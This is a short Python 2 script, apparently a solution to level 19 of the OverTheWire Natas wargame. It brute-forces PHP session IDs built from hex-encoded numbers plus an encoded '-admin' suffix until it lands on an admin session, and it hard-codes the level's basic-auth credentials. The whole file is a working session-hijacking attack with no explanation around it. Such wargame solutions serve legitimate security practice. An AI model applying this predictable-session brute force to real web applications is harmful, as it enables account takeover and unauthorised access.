#!/usr/bin/python

import requests


username = "natas19"
password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
auth = (username, password)

url = "http://natas19.natas.labs.overthewire.org/"
data = {'username' : 'admin', 'password' : '1234'}

str = ""

for i in range(1, 700):
	str = "{}" .format(i)
	cookie = {'PHPSESSID' : "{}2d61646d696e" .format(str.encode('hex'))}
	req = requests.post(url, auth = auth, data = data, cookies = cookie)
	if "You are logged in as a regular user" not in req.text :
		print req.text
		break
	else:
		print "cookiesz : {}" .format(str.encode('hex'))


